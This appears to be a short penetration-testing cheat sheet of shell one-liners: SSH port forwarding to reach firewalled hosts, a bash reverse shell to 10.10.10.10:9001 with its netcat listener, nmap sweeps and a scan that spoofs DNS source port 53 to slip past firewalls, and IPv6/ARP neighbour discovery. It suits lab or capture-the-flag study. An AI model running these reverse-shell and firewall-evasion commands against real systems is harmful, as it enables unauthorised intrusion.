# Thanks to https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
# Connect to listener for a reverse shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
# Setup a local listener for a reverse shell
nc -lnvp 9001
# See OS version/architecture on Linux
lsb_release -a
hostnamectl
cat /etc/os-release
# Nmap ping sweep
nmap -sP 172.31.1-255.1-255
# Nmap scan specifying a source port to bypass lazy firewall filtering 
# Here using DNS ports because it is often allowed (no DNS resolution) 
# and assuming that the host is alive
nmap -sS -p1-1024 -Pn -n -v --source-port 53 192.168.5.2
# Nmap on IPv6 target => IP is specified using [IP]%[NETWORK_CARD_IDENTIFIER]
nmap -6 -p 2222 --open fe80::5054:ff:fec6:7066%ens3
# SCP using IPv6 => IP is specified between []
scp -P 987 user@[fe80::5054:ff:fec6:7066%ens3]:/home/file.txt .
# SSH using IPv6 => IP is specified using [IP]%[NETWORK_CARD_IDENTIFIER]
ssh -p2222 user@fe80::5054:ff:fec6:7066%ens3
# Get IPv6 on hosts around (see script "identify-neighbour-hosts.sh")
# => Ping the multicast IPV6 address (ff02::1) to get the IPV6 address of neighbours
# => See https://en.wikipedia.org/wiki/Multicast_address#IPv6
# => See https://www.menandmice.com/blog/ipv6-reference-multicast/
# ens3 is the [NETWORK_CARD_IDENTIFIER]
ping6 -I ens3 ff02::1
# => List known hosts IPV6 addresses
ip -6 neigh
# => List known hosts IPV4 addresses and hosts in 
# => order to map corresponding IPV6 addresses based on MAC addresses and then identify hosts
# => Use 'arp -a' without param '-n' to see hostname
arp -an 
